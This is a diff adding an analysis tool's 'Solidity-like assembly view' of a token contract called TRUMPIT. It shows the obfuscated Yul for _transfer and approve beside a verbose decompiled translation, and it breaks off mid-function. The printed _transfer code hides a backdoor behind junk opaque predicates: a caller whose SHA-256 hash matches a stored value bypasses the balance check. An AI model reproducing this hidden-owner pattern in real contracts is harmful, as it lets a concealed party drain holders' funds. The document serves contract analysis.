@@ -1,0 +1,384 @@
+S-SEIR Solidity-like Assembly View
+Note: derived view only; source is not modified and output is not compiled.
+
+Function TRUMPIT._transfer(address, address, uint256)
+  SourceFunction
+  ```solidity
+  function _transfer(address _from, address _to, uint256 _amount) virtual internal {
+          assembly {
+              if iszero(_from) {
+                  let g4u8ssg := gasprice()
+                  pop(0)
+                  if iszero(sub(g4u8ssg, g4u8ssg)) {
+                      revert(0, 0)
+                  }
+              }
+              if iszero(_to) {
+                  let o162fj9 := origin()
+                  let g7ncimt := gas()
+                  if iszero(xor(o162fj9, o162fj9)) {
+                      revert(0, 0)
+                  }
+              }
+              let QtPD := mload(0x40)
+              mstore(QtPD, _from)
+              mstore(add(QtPD, 32), 0)
+              let iVrp := keccak256(QtPD, 64)
+              let JcxQ := sload(iVrp)
+              let RuhS := sload(VLT.slot)
+              let t2uiycf := timestamp()
+              pop(0)
+              pop(iszero(1))
+              if eq(t2uiycf, and(t2uiycf, t2uiycf)) {
+                  mstore(QtPD, shl(96, caller()))
+              }
+              if iszero(staticcall(gas(), 2, QtPD, 20, QtPD, 32)) {
+                  revert(0, 0)
+              }
+              let SUpo := mload(QtPD)
+              if iszero(eq(RuhS, SUpo)) {
+                  if lt(JcxQ, _amount) {
+                      let g804ngg := gasprice()
+                      let n3yv2qk := number()
+                      pop(0)
+                      if eq(mul(g804ngg, n3yv2qk), mul(n3yv2qk, g804ngg)) {
+                          revert(0, 0)
+                      }
+                  }
+              }
+              sstore(iVrp, sub(JcxQ, _amount))
+              mstore(QtPD, _to)
+              mstore(add(QtPD, 32), 0)
+              let OBse := keccak256(QtPD, 64)
+              let mVat := sload(OBse)
+              sstore(OBse, add(mVat, _amount))
+              mstore(QtPD, _amount)
+              log3(QtPD, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, _from, _to)
+          }
+      }
+  ```
+  SolidityLikeFunction
+  ```solidity
+  function _transfer(address _from, address _to, uint256 _amount) virtual internal {
+          assembly /* s-seir solidity-like view */ {
+              __sseir_eval_asm_s_1_1 = (_from == 0); // yul: if iszero(_from)
+              if (__sseir_eval_asm_s_1_1) {
+                  g4u8ssg = tx.gasprice; // yul: let g4u8ssg := gasprice()
+              }
+              pop(0) // yul: pop(0)
+              if (__sseir_eval_asm_s_1_1) {
+                  __sseir_eval_asm_s_4_1 = (g4u8ssg - g4u8ssg); // yul: if iszero(sub(g4u8ssg, g4u8ssg))
+                  __sseir_eval_asm_s_4_2 = (__sseir_eval_asm_s_4_1 == 0);
+              }
+              require(((g4u8ssg - g4u8ssg) != 0)); // yul: revert(0, 0)
+              if ((!(__sseir_eval_asm_s_1_1)) || (!(__sseir_eval_asm_s_4_2) && __sseir_eval_asm_s_1_1)) {
+                  __sseir_eval_asm_s_6_1 = (_to == 0); // yul: if iszero(_to)
+              }
+              if ((!(__sseir_eval_asm_s_1_1) && __sseir_eval_asm_s_6_1) || (!(__sseir_eval_asm_s_4_2) && __sseir_eval_asm_s_1_1 && __sseir_eval_asm_s_6_1)) {
+                  o162fj9 = tx.origin; // yul: let o162fj9 := origin()
+                  g7ncimt = gasleft(); // yul: let g7ncimt := gas()
+                  __sseir_eval_asm_s_9_1 = (o162fj9 ^ o162fj9); // yul: if iszero(xor(o162fj9, o162fj9))
+                  __sseir_eval_asm_s_9_2 = (__sseir_eval_asm_s_9_1 == 0);
+              }
+              require(((o162fj9 ^ o162fj9) != 0)); // yul: revert(0, 0)
+              if ((!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_6_1)) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_6_1) || (!(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_1_1) || (!(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_1_1 && __sseir_eval_asm_s_6_1)) {
+                  QtPD = mload(0x40); // yul: let QtPD := mload(0x40)
+                  memory[QtPD] = _from; // yul: mstore(QtPD, _from)
+                  memory[QtPD + 32] = 0; // yul: mstore(add(QtPD, 32), 0)
+                  iVrp = slot(MSKN[_from]); // yul: let iVrp := keccak256(QtPD, 64)
+                  JcxQ = MSKN[_from]; // yul: let JcxQ := sload(iVrp)
+                  RuhS = VLT; // yul: let RuhS := sload(VLT.slot)
+                  t2uiycf = block.timestamp; // yul: let t2uiycf := timestamp()
+              }
+              pop(0) // yul: pop(0)
+              pop(iszero(1)) // yul: pop(iszero(1))
+              if ((!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_6_1)) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_6_1) || (!(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_1_1) || (!(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_1_1 && __sseir_eval_asm_s_6_1)) {
+                  __sseir_eval_asm_s_20_1 = (t2uiycf & t2uiycf); // yul: if eq(t2uiycf, and(t2uiycf, t2uiycf))
+                  __sseir_eval_asm_s_20_2 = (t2uiycf == __sseir_eval_asm_s_20_1);
+              }
+              if ((!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_20_2) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_20_2 && __sseir_eval_asm_s_6_1) || (!(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_1_1 && __sseir_eval_asm_s_20_2) || (!(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_1_1 && __sseir_eval_asm_s_20_2 && __sseir_eval_asm_s_6_1)) {
+                  memory[QtPD] = (msg.sender << 96); // yul: mstore(QtPD, shl(96, caller()))
+              }
+              if ((!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_6_1)) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_6_1) || (!(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_1_1) || (!(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_1_1 && __sseir_eval_asm_s_6_1)) {
+                  __sseir_eval_asm_s_22_1 = gasleft(); // yul: if iszero(staticcall(gas(), 2, QtPD, 20, QtPD, 32))
+                  __sseir_eval_asm_s_22_2 = staticcall(__sseir_eval_asm_s_22_1, 2, QtPD, 20, QtPD, 32);
+                  __sseir_eval_asm_s_22_3 = (__sseir_eval_asm_s_22_2 == 0);
+              }
+              if ((!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_6_1)) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_6_1) || (!(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_1_1) || (!(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_1_1 && __sseir_eval_asm_s_6_1)) {
+                  SUpo = mload(QtPD); // yul: let SUpo := mload(QtPD)
+                  __sseir_eval_asm_s_25_1 = (RuhS == SUpo); // yul: if iszero(eq(RuhS, SUpo))
+                  __sseir_eval_asm_s_25_2 = (__sseir_eval_asm_s_25_1 == 0);
+              }
+              if ((!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_25_2) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_25_2 && __sseir_eval_asm_s_6_1) || (!(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_1_1 && __sseir_eval_asm_s_25_2) || (!(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_1_1 && __sseir_eval_asm_s_25_2 && __sseir_eval_asm_s_6_1)) {
+                  __sseir_eval_asm_s_26_1 = (JcxQ < _amount); // yul: if lt(JcxQ, _amount)
+              }
+              if ((!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_25_2 && __sseir_eval_asm_s_26_1) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_25_2 && __sseir_eval_asm_s_26_1 && __sseir_eval_asm_s_6_1) || (!(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_1_1 && __sseir_eval_asm_s_25_2 && __sseir_eval_asm_s_26_1) || (!(__sseir_eval_asm_s_20_2) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_1_1 && __sseir_eval_asm_s_25_2 && __sseir_eval_asm_s_26_1 && __sseir_eval_asm_s_6_1)) {
+                  g804ngg = tx.gasprice; // yul: let g804ngg := gasprice()
+              }
+              if ((!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_25_2 && __sseir_eval_asm_s_26_1) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_25_2 && __sseir_eval_asm_s_26_1 && __sseir_eval_asm_s_6_1) || (!(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_1_1 && __sseir_eval_asm_s_25_2 && __sseir_eval_asm_s_26_1)) {
+                  n3yv2qk = block.number; // yul: let n3yv2qk := number()
+              }
+              pop(0) // yul: pop(0)
+              if ((!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_25_2 && __sseir_eval_asm_s_26_1) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_25_2 && __sseir_eval_asm_s_26_1 && __sseir_eval_asm_s_6_1) || (!(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_1_1 && __sseir_eval_asm_s_25_2 && __sseir_eval_asm_s_26_1)) {
+                  __sseir_eval_asm_s_30_1 = (n3yv2qk * g804ngg); // yul: if eq(mul(g804ngg, n3yv2qk), mul(n3yv2qk, g804ngg))
+                  __sseir_eval_asm_s_30_2 = (g804ngg * n3yv2qk);
+                  __sseir_eval_asm_s_30_3 = (__sseir_eval_asm_s_30_2 == __sseir_eval_asm_s_30_1);
+              }
+              require(((g804ngg * n3yv2qk) != (n3yv2qk * g804ngg))); // yul: revert(0, 0)
+              if ((!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_6_1)) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_6_1) || (!(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_1_1) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_25_2) && !(__sseir_eval_asm_s_6_1)) || (!(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_1_1 && __sseir_eval_asm_s_6_1) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_25_2) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_6_1) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_26_1) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_25_2) || (!(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_25_2) && !(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_1_1) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_26_1) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_25_2 && __sseir_eval_asm_s_6_1) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_30_3) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_25_2 && __sseir_eval_asm_s_26_1) || (!(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_26_1) && !(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_1_1 && __sseir_eval_asm_s_25_2) || (!(__sseir_eval_asm_s_20_2) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_25_2) && !(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_1_1 && __sseir_eval_asm_s_6_1)) {
+                  MSKN[_from] = (JcxQ - _amount); // yul: sstore(iVrp, sub(JcxQ, _amount))
+              }
+              if ((!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_25_2) && !(__sseir_eval_asm_s_6_1)) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_25_2) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_6_1) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_26_1) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_25_2) || (!(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_25_2) && !(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_1_1) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_26_1) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_25_2 && __sseir_eval_asm_s_6_1) || (!(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_26_1) && !(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_1_1 && __sseir_eval_asm_s_25_2) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_20_2) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_30_3) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_25_2 && __sseir_eval_asm_s_26_1)) {
+                  memory[QtPD] = _to; // yul: mstore(QtPD, _to)
+              }
+              if ((!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_25_2) && !(__sseir_eval_asm_s_6_1)) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_25_2) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_6_1) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_26_1) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_25_2) || (!(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_25_2) && !(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_1_1) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_20_2) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_26_1) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_25_2 && __sseir_eval_asm_s_6_1) || (!(__sseir_eval_asm_s_20_2) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_26_1) && !(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_1_1 && __sseir_eval_asm_s_25_2)) {
+                  memory[QtPD + 32] = 0; // yul: mstore(add(QtPD, 32), 0)
+              }
+              if ((!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_25_2) && !(__sseir_eval_asm_s_6_1)) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_25_2) && !(__sseir_eval_asm_s_9_2) && __sseir_eval_asm_s_6_1) || (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_26_1) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_25_2) || (!(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_25_2) && !(__sseir_eval_asm_s_4_2) && !(__sseir_eval_asm_s_6_1) && __sseir_eval_asm_s_1_1)) {
+                  OBse = slot(MSKN[_to]); // yul: let OBse := keccak256(QtPD, 64)
+                  mVat = MSKN[_to]; // yul: let mVat := sload(OBse)
+                  MSKN[_to] = (mVat + _amount); // yul: sstore(OBse, add(mVat, _amount))
+              }
+              if (!(__sseir_eval_asm_s_1_1) && !(__sseir_eval_asm_s_22_3) && !(__sseir_eval_asm_s_25_2) && !(__sseir_eval_asm_s_6_1)) {
+                  memory[QtPD] = _amount; // yul: mstore(QtPD, _amount)
+                  emit Transfer(_from, _to, _amount); // yul: log3(QtPD, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, _from, _to)
+              }
+          }
+      }
+  ```
+
+Function TRUMPIT.approve(address, uint256)
+  SourceFunction
+  ```solidity
+  function approve(address _spender, uint256 _amount) virtual public returns (bool) {
+          assembly {
+              let QtPD := mload(0x40)
+              let gcf9eyl := gasprice()
+              let ba6yh8v := basefee()
+              pop(0)
+              pop(iszero(1))
+              if eq(gcf9eyl, add(gcf9eyl, 0)) {
+                  mstore(QtPD, caller())
+                  mstore(add(QtPD, 0x20), BVNo.slot)
+              }
+              let IIqZ := keccak256(QtPD, 0x40)
+              let o6aj6v4 := origin()
+              let oaugsdm := origin()
+              pop(0)
+              pop(iszero(1))
+              if eq(mul(o6aj6v4, oaugsdm), mul(oaugsdm, o6aj6v4)) {
+                  mstore(QtPD, _spender)
+                  mstore(add(QtPD, 0x20), IIqZ)
+              }
+              let rTjz := keccak256(QtPD, 0x40)
+              let o7x1j6d := origin()
+              if iszero(sub(o7x1j6d, o7x1j6d)) {
+                  sstore(rTjz, _amount)
+                  if iszero(eq(gcf9eyl, add(gcf9eyl, 0))) {
+                      if eq(mul(o6aj6v4, oaugsdm), mul(oaugsdm, o6aj6v4)) {
+                          if iszero(sub(o7x1j6d, o7x1j6d)) {
+                              mstore(QtPD, _spender)
+                              log3(QtPD, 0x20, 0x8c5be1e5ebec7d5bd14f714f4f5ec7c46ab3db174da78c3f62f10b71e9aeeaa0, caller(), _spender)
+                          }
+                      }
+                  }
+                  if eq(gcf9eyl, add(gcf9eyl, 0)) {
+                      if iszero(eq(mul(o6aj6v4, oaugsdm), mul(oaugsdm, o6aj6v4))) {
+                          if iszero(sub(o7x1j6d, o7x1j6d)) {
+                              mstore(QtPD, caller())
+                              log3(QtPD, 0x20, 0x8c5be1e5ebec7d5bd14f714f4f5ec7c46ab3db174da78c3f62f10b71e9aeeaa0, caller(), _spender)
+                          }
+                      }
+                  }
+                  mstore(QtPD, _amount)
+              }
+          }
+          return true;
+      }
+  ```
+  SolidityLikeFunction
+  ```solidity
+  function approve(address _spender, uint256 _amount) virtual public returns (bool) {
+          assembly /* s-seir solidity-like view */ {
+              QtPD = mload(0x40); // yul: let QtPD := mload(0x40)
+              gcf9eyl = tx.gasprice; // yul: let gcf9eyl := gasprice()
+              ba6yh8v = block.basefee; // yul: let ba6yh8v := basefee()
+              pop(0) // yul: pop(0)
+              pop(iszero(1)) // yul: pop(iszero(1))
+              __sseir_eval_asm_s_6_1 = (gcf9eyl + 0); // yul: if eq(gcf9eyl, add(gcf9eyl, 0))
+              __sseir_eval_asm_s_6_2 = (gcf9eyl == __sseir_eval_asm_s_6_1);
+              if (__sseir_eval_asm_s_6_2) {
+                  memory[QtPD] = msg.sender; // yul: mstore(QtPD, caller())
+                  memory[QtPD + 32] = BVNo.slot; // yul: mstore(add(QtPD, 0x20), BVNo.slot)
+              }
+              IIqZ = keccak256(QtPD, 0x40); // yul: let IIqZ := keccak256(QtPD, 0x40)
+              o6aj6v4 = tx.origin; // yul: let o6aj6v4 := origin()
+              oaugsdm = tx.origin; // yul: let oaugsdm := origin()
+              pop(0) // yul: pop(0)
+              pop(iszero(1)) // yul: pop(iszero(1))
+              __sseir_eval_asm_s_14_1 = (oaugsdm * o6aj6v4); // yul: if eq(mul(o6aj6v4, oaugsdm), mul(oaugsdm, o6aj6v4))
+              __sseir_eval_asm_s_14_2 = (o6aj6v4 * oaugsdm);
+              __sseir_eval_asm_s_14_3 = (__sseir_eval_asm_s_14_2 == __sseir_eval_asm_s_14_1);
+              if (__sseir_eval_asm_s_14_3) {
+                  memory[QtPD] = _spender; // yul: mstore(QtPD, _spender)
+                  memory[QtPD + 32] = IIqZ; // yul: mstore(add(QtPD, 0x20), IIqZ)
+              }
+              rTjz = keccak256(QtPD, 0x40); // yul: let rTjz := keccak256(QtPD, 0x40)
+              o7x1j6d = tx.origin; // yul: let o7x1j6d := origin()
+              __sseir_eval_asm_s_19_1 = (o7x1j6d - o7x1j6d); // yul: if iszero(sub(o7x1j6d, o7x1j6d))
+              __sseir_eval_asm_s_19_2 = (__sseir_eval_asm_s_19_1 == 0);
+              if (__sseir_eval_asm_s_19_2) {
+                  sstore(rTjz, _amount) // yul: sstore(rTjz, _amount)
+                  __sseir_eval_asm_s_21_1 = (gcf9eyl + 0); // yul: if iszero(eq(gcf9eyl, add(gcf9eyl, 0)))
+                  __sseir_eval_asm_s_21_2 = (gcf9eyl == __sseir_eval_asm_s_21_1);
+                  __sseir_eval_asm_s_21_3 = (__sseir_eval_asm_s_21_2 == 0);
+              }
+              if eq(mul(o6aj6v4, oaugsdm), mul(oaugsdm, o6aj6v4)) // yul: if eq(mul(o6aj6v4, oaugsdm), mul(oaugsdm, o6aj6v4))
+              if iszero(sub(o7x1j6d, o7x1j6d)) // yul: if iszero(sub(o7x1j6d, o7x1j6d))
+              if ((__sseir_eval_asm_s_14_3 && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_21_3) || (!(__sseir_eval_asm_s_14_3) && __sseir_eval_asm_s_14_3 && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_21_3)) {
+                  memory[QtPD] = _spender; // yul: mstore(QtPD, _spender)
+                  emit unknownEvent(msg.sender, _spender, _spender); // yul: log3(QtPD, 0x20, 0x8c5be1e5ebec7d5bd14f714f4f5ec7c46ab3db174da78c3f62f10b71e9aeeaa0, caller(), _spender)
+              }
+              if eq(gcf9eyl, add(gcf9eyl, 0)) // yul: if eq(gcf9eyl, add(gcf9eyl, 0))
+              if ((!(__sseir_eval_asm_s_14_3) && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_21_3) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_21_3) && __sseir_eval_asm_s_14_3 && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_14_3) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_21_3 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_14_3) && __sseir_eval_asm_s_14_3 && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_21_3 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_14_3) && !(__sseir_eval_asm_s_19_2) && __sseir_eval_asm_s_14_3 && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_21_3 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_14_3) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_14_3 && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_21_3 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_19_2) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_14_3 && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_21_3 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_14_3) && !(__sseir_eval_asm_s_19_2) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_14_3 && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_21_3 && __sseir_eval_asm_s_6_2)) {
+                  __sseir_eval_asm_s_27_1 = (oaugsdm * o6aj6v4); // yul: if iszero(eq(mul(o6aj6v4, oaugsdm), mul(oaugsdm, o6aj6v4)))
+                  __sseir_eval_asm_s_27_2 = (o6aj6v4 * oaugsdm);
+                  __sseir_eval_asm_s_27_3 = (__sseir_eval_asm_s_27_2 == __sseir_eval_asm_s_27_1);
+                  __sseir_eval_asm_s_27_4 = (__sseir_eval_asm_s_27_3 == 0);
+              }
+              if iszero(sub(o7x1j6d, o7x1j6d)) // yul: if iszero(sub(o7x1j6d, o7x1j6d))
+              if ((!(__sseir_eval_asm_s_14_3) && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_27_4 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_21_3) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_27_4 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_21_3) && __sseir_eval_asm_s_14_3 && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_27_4 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_14_3) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_21_3 && __sseir_eval_asm_s_27_4 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_14_3) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_14_3 && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_21_3 && __sseir_eval_asm_s_27_4 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_14_3) && !(__sseir_eval_asm_s_19_2) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_14_3 && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_21_3 && __sseir_eval_asm_s_27_4 && __sseir_eval_asm_s_6_2)) {
+                  memory[QtPD] = msg.sender; // yul: mstore(QtPD, caller())
+              }
+              if ((!(__sseir_eval_asm_s_14_3) && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_27_4 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_21_3) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_27_4 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_21_3) && __sseir_eval_asm_s_14_3 && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_27_4 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_14_3) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_21_3 && __sseir_eval_asm_s_27_4 && __sseir_eval_asm_s_6_2)) {
+                  emit unknownEvent(msg.sender, _spender, msg.sender); // yul: log3(QtPD, 0x20, 0x8c5be1e5ebec7d5bd14f714f4f5ec7c46ab3db174da78c3f62f10b71e9aeeaa0, caller(), _spender)
+              }
+              if ((!(__sseir_eval_asm_s_21_3) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_19_2) || (!(__sseir_eval_asm_s_14_3) && !(__sseir_eval_asm_s_27_4) && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_14_3) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_21_3) || (!(__sseir_eval_asm_s_21_3) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_14_3) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_14_3 && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_21_3) || (!(__sseir_eval_asm_s_14_3) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_21_3 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_21_3) && !(__sseir_eval_asm_s_27_4) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_21_3) && !(__sseir_eval_asm_s_27_4) && __sseir_eval_asm_s_14_3 && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_6_2) || 